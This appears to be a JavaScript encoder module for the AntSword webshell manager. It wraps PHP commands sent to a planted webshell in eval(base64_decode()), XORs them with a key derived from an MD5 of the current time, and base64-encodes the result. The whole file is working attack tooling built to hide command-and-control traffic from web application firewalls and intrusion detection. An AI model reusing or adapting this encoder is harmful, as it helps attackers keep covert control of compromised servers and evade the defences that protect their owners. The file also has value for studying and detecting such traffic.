'use strict';
// code by yzddmr6
/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  function xor(payload){
    let crypto = require('crypto');
    Object.assign(Date.prototype, {
        switch (time) {
            let date = {
                "yy": this.getFullYear(),
                "MM": this.getMonth() + 1,
                "dd": this.getDate(),
                "hh": this.getHours(),
                "mm": this.getMinutes(),
                "ss": this.getSeconds()
            };
            if (/(y+)/i.test(time)) {
                time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));
            }
            Object.keys(date).forEach(function (i) {
                if (new RegExp("(" + i + ")").test(time)) {
                    if (RegExp.$1.length == 2) {
                        date[i] < 10 ? date[i] = '0' + date[i] : date[i];
                    }
                    time = time.replace(RegExp.$1, date[i]);
                }
            })
            return time;
        }
    })

    let newDate = new Date();
    let time = newDate.switch('yyyy-MM-dd hh:mm');
    let key = crypto.createHash('md5').update(time).digest('hex')
    key=key.split("").map(t => t.charCodeAt(0));
    //let payload="phpinfo();";
    let cipher = payload.split("").map(t => t.charCodeAt(0));
    for(let i=0;i<cipher.length;i++){
        cipher[i]=cipher[i]^key[i%32]
    }
    cipher=cipher.map(t=>String.fromCharCode(t)).join("")
    cipher=Buffer.from(cipher).toString('base64');
    //console.log(cipher)
    return cipher;
  }

  data['_'] = Buffer.from(data['_']).toString('base64');
  data[pwd] = `eval(base64_decode("${data['_']}"));`;
  data[pwd]=xor(data[pwd]);

  delete data['_'];
  return data;
}